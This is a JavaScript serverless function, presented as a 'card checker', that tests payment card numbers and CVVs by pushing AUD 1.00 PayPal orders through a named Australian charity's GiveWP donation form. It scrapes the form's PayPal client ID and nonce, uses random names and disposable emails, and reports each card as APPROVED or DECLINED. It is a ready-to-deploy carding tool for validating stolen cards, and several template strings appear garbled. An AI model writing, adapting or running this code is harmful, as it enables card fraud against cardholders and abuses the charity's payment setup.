// check.js
// Vercel Serverless Function - Card checker via PayPal Commerce
// POST to /api/check with JSON body

const randomString = (length) => {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
};

const tempMailDomains = [
  'tempmail.lol',
  '1secmail.com',
  '1secmail.net',
  'dispostable.com',
  'mail.tm',
  'tempmail.plus',
  'fake-mail.org',
  'throwawaymail.com',
  'guerrillamail.com',
  'sharklasers.com',
  '10minutemail.com',
  'yopmail.com',
  'proton.me'
];

function generateRandomEmail() {
  const username = randomString(10 + Math.floor(Math.random() * 6));
  const domain = tempMailDomains[Math.floor(Math.random() * tempMailDomains.length)];
  return `\( {username}@ \){domain}`;
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed - use POST' });
  }

  let cardData;
  try {
    cardData = req.body;
  } catch (e) {
    return res.status(400).json({ error: 'Invalid JSON body' });
  }

  const { number, month, yearShort, cvv } = cardData;

  if (!number || !month || !yearShort || !cvv) {
    return res.status(400).json({
      error: 'Missing required fields',
      required: ['number', 'month', 'yearShort', 'cvv']
    });
  }

  // Clean card data
  const cleanNumber = number.toString().replace(/\s+/g, '').trim();
  const cleanMonth  = month.toString().padStart(2, '0');
  const fullYear    = `20${yearShort.toString().padStart(2, '0')}`;

  const email = generateRandomEmail();
  const firstName = randomString(6);
  const lastName  = randomString(6);

  const result = {
    card: `\( {cleanNumber}| \){cleanMonth}|\( {yearShort}| \){cvv}`,
    email_used: email,
    status: 'error',
    message: '',
    details: null,
    timestamp: new Date().toISOString()
  };

  let cookieJar = new Map();

  const makeRequest = async (url, opts = {}) => {
    const headers = new Headers(opts.headers || {});

    if (cookieJar.size > 0) {
      const cookieStr = Array.from(cookieJar)
        .map(([k, v]) => `\( {k}= \){v}`)
        .join('; ');
      headers.set('Cookie', cookieStr);
    }

    if (!headers.has('User-Agent')) {
      headers.set(
        'User-Agent',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'
      );
    }

    const response = await fetch(url, {
      ...opts,
      headers,
      redirect: 'follow'
    });

    const setCookieHeader = response.headers.get('set-cookie');
    if (setCookieHeader) {
      setCookieHeader.split(',').forEach(cookie => {
        const parts = cookie.split(';')[0].trim();
        if (parts.includes('=')) {
          const [name, ...valueParts] = parts.split('=');
          const value = valueParts.join('=');
          if (name && value) {
            cookieJar.set(name.trim(), value.trim());
          }
        }
      });
    }

    return response;
  };

  try {
    // 1. Load donation page
    const homeRes = await makeRequest('https://animalrights.org.au/donate-now/');
    const homeHtml = await homeRes.text();

    const formUrlMatch = homeHtml.match(/data-form-view-url=['"]([^'"]+)['"]/);
    if (!formUrlMatch) throw new Error('Cannot find form-view-url');

    let formUrl = formUrlMatch[1].replace(/&amp;/g, '&');

    // 2. Load form data
    const formRes = await makeRequest(formUrl);
    const formHtml = await formRes.text();

    const exportsMatch = formHtml.match(/window\.givewpDonationFormExports\s*=\s*({[\s\S]*?});/);
    if (!exportsMatch) throw new Error('Cannot find givewpDonationFormExports');

    let exportsStr = exportsMatch[1];
    exportsStr = exportsStr.replace(/,\s*}/g, '}').replace(/,\s*]/g, ']');

    const formData = JSON.parse(exportsStr);

    const paypalGateway = formData.registeredGateways?.find(g => g.id === 'paypal-commerce');
    const settings = paypalGateway?.settings || formData.registeredGateways?.[0]?.settings;

    if (!settings?.sdkOptions?.clientId) {
      throw new Error('Cannot find PayPal client ID');
    }

    const clientId = settings.sdkOptions.clientId;

    // 3. Get PayPal access token
    const auth = Buffer.from(`${clientId}:`).toString('base64');

    const tokenRes = await makeRequest('https://www.paypal.com/v1/oauth2/token', {
      method: 'POST',
      headers: {
        'Authorization': `Basic ${auth}`,
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'application/json'
      },
      body: 'grant_type=client_credentials'
    });

    if (!tokenRes.ok) {
      const errText = await tokenRes.text();
      throw new Error(`PayPal token request failed (${tokenRes.status}): ${errText}`);
    }

    const tokenJson = await tokenRes.json();
    const accessToken = tokenJson.access_token;

    if (!accessToken) throw new Error('No access token received');

    // 4. Create PayPal order
    const donateUrlParams = new URLSearchParams(new URL(formData.donateUrl).search);

    const formPayload = new FormData();
    formPayload.append('action', 'give_paypal_commerce_create_order');
    formPayload.append('give-form-id', settings.donationFormId.toString());
    formPayload.append('give-form-hash', settings.donationFormNonce);
    formPayload.append('give_payment_mode', 'paypal-commerce');
    formPayload.append('give-amount', '1.00');
    formPayload.append('give_first', firstName);
    formPayload.append('give_last', lastName);
    formPayload.append('give_email', email);
    formPayload.append('give-cs-form-currency', 'AUD');

    const orderRes = await makeRequest('https://animalrights.org.au/wp-admin/admin-ajax.php', {
      method: 'POST',
      body: formPayload
    });

    const orderJson = await orderRes.json();

    if (!orderJson?.data?.id) {
      throw new Error('No PayPal order ID received');
    }

    const orderId = orderJson.data.id;

    // 5. Confirm card
    const confirmRes = await makeRequest(
      `https://www.paypal.com/v2/checkout/orders/${orderId}/confirm-payment-source`,
      {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${accessToken}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          payment_source: {
            card: {
              number: cleanNumber,
              security_code: cvv,
              expiry: `\( {fullYear}- \){cleanMonth}`
            }
          }
        })
      }
    );

    const confirmJson = await confirmRes.json();

    result.details = confirmJson;

    if (confirmJson.status === 'APPROVED') {
      result.status = 'APPROVED';
      // Final donation step is optional for checking — commented out to reduce time
      // You can uncomment if you really need it (but increases timeout risk)
      /*
      const finalParams = new URLSearchParams({
        'givewp-route': 'donate',
        'givewp-route-signature': donateUrlParams.get('givewp-route-signature'),
        'givewp-route-signature-id': donateUrlParams.get('givewp-route-signature-id'),
        'givewp-route-signature-expiration': donateUrlParams.get('givewp-route-signature-expiration')
      });

      const finalForm = new FormData();
      finalForm.append('amount', '1.00');
      finalForm.append('currency', 'AUD');
      finalForm.append('donationType', 'single');
      finalForm.append('formId', settings.donationFormId.toString());
      finalForm.append('gatewayId', 'paypal-commerce');
      finalForm.append('firstName', firstName);
      finalForm.append('lastName', lastName);
      finalForm.append('email', email);
      finalForm.append('anonymous', 'false');
      finalForm.append('isEmbed', 'true');
      finalForm.append('embedId', 'give-form-shortcode-1');
      finalForm.append('locale', 'en_AU');
      finalForm.append('gatewayData[payPalOrderId]', orderId);
      finalForm.append('originUrl', 'https://animalrights.org.au/donate-now/');

      await makeRequest(`https://animalrights.org.au/?${finalParams.toString()}`, {
        method: 'POST',
        body: finalForm,
        headers: { 'Accept': 'application/json' }
      });
      */
    } else {
      result.status = 'DECLINED';
      result.message = confirmJson?.name || confirmJson?.message || 'Declined by PayPal';
    }

  } catch (err) {
    result.status = 'error';
    result.message = err.message;
    if (err.stack) {
      result.stack = err.stack.split('\n').slice(0, 6);
    }
  }

  return res.status(200).json(result);
}

export const config = {
  api: {
    bodyParser: {
      sizeLimit: '4mb'
    }
  },
  maxDuration: 30,          // seconds — Hobby plan max 10s, Pro needed for >10s
};
